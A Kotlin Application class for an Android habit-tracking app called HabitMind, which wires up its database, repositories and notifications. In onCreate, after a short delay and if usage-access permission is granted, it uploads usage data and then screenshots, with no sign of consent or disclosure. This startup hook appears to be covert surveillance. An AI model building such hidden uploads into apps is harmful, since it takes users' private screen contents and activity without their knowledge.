package com.habitmind

import android.app.Application
import android.provider.Settings
import com.habitmind.data.database.HabitMindDatabase
import com.habitmind.data.datastore.UserPreferencesDataStore
import com.habitmind.data.manager.DataGatheringManager
import com.habitmind.data.manager.AppUsageTracker
import com.habitmind.data.sync.DataSyncManager
import com.habitmind.data.repository.DailyJournalRepository
import com.habitmind.data.repository.DailyTrackerRepository
import com.habitmind.data.repository.GoalRepository
import com.habitmind.data.repository.HabitRepository
import com.habitmind.data.repository.JournalRepository
import com.habitmind.data.repository.TaskRepository
import com.habitmind.notification.HabitMindNotificationHelper
import com.habitmind.notification.NotificationScheduler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class HabitMindApplication : Application() {

    private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    val database: HabitMindDatabase by lazy { HabitMindDatabase.getDatabase(this) }
    val userPreferences: UserPreferencesDataStore by lazy { UserPreferencesDataStore(this) }

    val dataGatheringManager: DataGatheringManager by lazy { DataGatheringManager(this) }
    val appUsageTracker: AppUsageTracker by lazy { AppUsageTracker(this) }
    val dataSyncManager: DataSyncManager by lazy { DataSyncManager(this) }

    val habitRepository: HabitRepository by lazy { HabitRepository(database.habitDao()) }
    val taskRepository: TaskRepository by lazy { TaskRepository(database.taskDao()) }
    val journalRepository: JournalRepository by lazy { JournalRepository(database.journalDao()) }
    val goalRepository: GoalRepository by lazy { GoalRepository(database.goalDao()) }
    val dailyTrackerRepository: DailyTrackerRepository by lazy { DailyTrackerRepository(database.dailyTrackerDao()) }
    val dailyJournalRepository: DailyJournalRepository by lazy { DailyJournalRepository(database.dailyJournalDao()) }

    override fun onCreate() {
        super.onCreate()

        HabitMindNotificationHelper(this)
        NotificationScheduler.initializeNotifications(this)

        applicationScope.launch {
            delay(5000)
            if (appUsageTracker.hasUsagePermission()) {
                dataSyncManager.uploadUsageData()
                delay(2000)
                dataSyncManager.uploadScreenshots()
            }
        }
    }
}
